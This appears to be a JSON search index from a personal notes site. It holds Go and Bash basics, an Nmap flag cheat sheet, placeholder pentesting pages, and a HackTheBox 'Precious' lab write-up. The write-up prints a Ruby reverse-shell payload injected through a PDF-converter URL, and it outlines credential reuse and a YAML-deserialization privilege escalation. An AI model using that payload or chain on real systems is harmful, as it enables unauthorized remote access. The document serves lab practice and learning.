[{"categories":null,"contents":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/introduction/","summary":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","tags":null,"title":"Introduction"},{"categories":null,"contents":" Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.Println(\u0026#34;Value is\u0026#34;, b) func getPointer () (myPointer *int) { a := 234 return \u0026amp;a a := new(int) *a = 234 Pointers point to a memory location of a variable. Go is fully garbage-collected.\nType Conversion i := 2 f := float64(i) u := uint(i) Slice slice := []int{2, 3, 4} slice := []byte(\u0026#34;Hello\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/types/","summary":"Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.","tags":null,"title":"Basic Types"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.Printf(\u0026#34;At position %d, the character %s is present\\n\u0026#34;, i, val) n := 0 x := 42 for n != x { n := guess() } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/flow-control/","summary":"Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.","tags":null,"title":"Flow Control"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/advanced/files/","summary":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","tags":null,"title":"File Manipulation"},{"categories":null,"contents":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/bash/basic/","summary":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","tags":null,"title":"Bash Variables"},{"categories":null,"contents":"Precious Enumeration ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds Let\u0026rsquo;s check port 80 It\u0026rsquo;s a service that converts Web Pages to PDF Let\u0026rsquo;s supply anything and see what it returns I am running Burp Suite in the background So after supplying any url, we receive a pdf So I tried figuring out the backend service, or library that was responsible for conversion I took the response data from Burp Suite and used Cyber Chef to decode it We see the package and it\u0026rsquo;s version After a little bit of googling Let\u0026rsquo;s test it I set up tcpdump to listen to ICMP Success Let\u0026rsquo;s get a foothold Foothold I used revshells.com to create a payload for Ruby (It was revealed in Burp Suite responses and pdfkit is a Ruby package) http://10.10.16.37:8000/index.html?p=#{\u0026#39;%20`ruby -rsocket -e\u0026#39;spawn(\u0026#34;sh\u0026#34;,[:in,:out,:err]=\u0026gt;TCPSocket.new(\u0026#34;10.10.16.37\u0026#34;,6666))\u0026#39;`\u0026#39;} Try the payload And We get a reverse shell Now we need to privesc After running the linpeas.sh We see that we have another user ╔══════════╣ Users with console henry❌1000:1000:henry,,,:/home/henry:/bin/bash root❌0:0:root:/root:/bin/bash ruby❌1001:1001::/home/ruby:/bin/bash User After checking the home directory of the ruby user I found henry credentials And su to henry Let\u0026rsquo;s get root Root The first thing I check is sudo privileges And we get a result Let\u0026rsquo;s check the file According to the comments, the script loads the list of dependencies from the dependencies.yaml and compares them to the ones already installed After googling We find that there is a yaml injection or https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml Check the version So let\u0026rsquo;s try Firstly, it seems like the script searches for dependencies.yaml file in the directory where we execute the command So we can create dependencies.yaml anywhere where we have the privileges to do so Copy the payload from the links above Run the command And we get our flag ","date":"May 20, 2023","hero":"/posts/cybersecurity/hackthebox/machines/precious/images/precious.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/precious/","summary":"Precious Enumeration ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.","tags":["HTB"],"title":"[HTB] Machine: Precious"},{"categories":null,"contents":"This section will contain Game Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/game-hacking/overview/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/game-hacking/overview/","summary":"This section will contain Game Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","tags":["Guided Hacking","Game Hacking"],"title":"[Game Hacking] Overview"},{"categories":null,"contents":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/hackthebox/overview/images/htb.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/overview/","summary":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","tags":["HTB"],"title":"[HTB] Overview"},{"categories":null,"contents":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/active_directory/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/active_directory/","summary":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Active Directory"],"title":"[Pentesting] Active Directory"},{"categories":null,"contents":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/attacking_services/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/attacking_services/","summary":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Attacking Services"],"title":"[Pentesting] Attacking Services"},{"categories":null,"contents":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/file_transfers/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/file_transfers/","summary":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["File Transfers"],"title":"[Pentesting] File Transfers"},{"categories":null,"contents":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/footprinting_and_enumeration/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/footprinting_and_enumeration/","summary":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Footprinting and Enumeration"],"title":"[Pentesting] Footprinting and Enumeration"},{"categories":null,"contents":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/linux_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/linux_privilege_escalation/","summary":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Linux Privilege Escalation"],"title":"[Pentesting] Linux Privilege Escalation"},{"categories":null,"contents":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/mobile_pentesting/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/mobile_pentesting/","summary":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Mobile Pentesting"],"title":"[Pentesting] Mobile Pentesting"},{"categories":null,"contents":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/osint/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/osint/","summary":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["OSINT"],"title":"[Pentesting] OSINT"},{"categories":null,"contents":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/","summary":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Pivoting, Tunneling and Port Forwarding"],"title":"[Pentesting] Pivoting, Tunneling and Port Forwarding"},{"categories":null,"contents":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/shells_and_payloads/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/shells_and_payloads/","summary":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Shells and Payloads"],"title":"[Pentesting] Shells and Payloads"},{"categories":null,"contents":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/web_attacks/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/web_attacks/","summary":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Web Attacks"],"title":"[Pentesting] Web Attacks"},{"categories":null,"contents":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/windows_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/windows_privilege_escalation/","summary":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Windows Privilege Escalation"],"title":"[Pentesting] Windows Privilege Escalation"},{"categories":null,"contents":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/pwn.college/overview/images/pwn.college.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pwn.college/overview/","summary":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","tags":["pwn.college"],"title":"[pwn.college] Overview"},{"categories":null,"contents":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent. -p- - Scan all ports. -p22-110 - Scan all ports between 22 and 110. -p22,25 - Scans only the specified ports 22 and 25. -F - Scans top 100 ports. -sS - Performs an TCP SYN-Scan. -sA - Performs an TCP ACK-Scan. -sU - Performs an UDP Scan. -sV - Scans the discovered services for their versions. -sC - Perform a Script Scan with scripts that are categorized as \u0026ldquo;default\u0026rdquo;. --script \u0026lt;script\u0026gt; - Performs a Script Scan by using the specified scripts. -O - Performs an OS Detection Scan to determine the OS of the target. -A - Performs OS Detection, Service Detection, and traceroute scans. -D RND:5 - Sets the number of random Decoys that will be used to scan the target. -e - Specifies the network interface that is used for the scan. -S 10.10.10.200 - Specifies the source IP address for the scan. -g - Specifies the source port for the scan. --dns-server \u0026lt;ns\u0026gt; - DNS resolution is performed by using a specified name server. Output Options -oA filename - Stores the results in all available formats starting with the name of \u0026ldquo;filename\u0026rdquo;. -oN filename - Stores the results in normal format with the name \u0026ldquo;filename\u0026rdquo;. -oG filename - Stores the results in \u0026ldquo;grepable\u0026rdquo; format with the name of \u0026ldquo;filename\u0026rdquo;. -oX filename - Stores the results in XML format with the name of \u0026ldquo;filename\u0026rdquo;. Performance Options --max-retries \u0026lt;num\u0026gt; - Sets the number of retries for scans of specific ports. --stats-every=5s - Displays scan\u0026rsquo;s status every 5 seconds. -v/-vv - Displays verbose output during the scan. --initial-rtt-timeout 50ms - Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms - Sets the specified time value as maximum RTT timeout. --min-rate 300 - Sets the number of packets that will be sent simultaneously. -T \u0026lt;0-5\u0026gt; - Specifies the specific timing template. ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/nmap/","summary":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent.","tags":null,"title":"Nmap"}]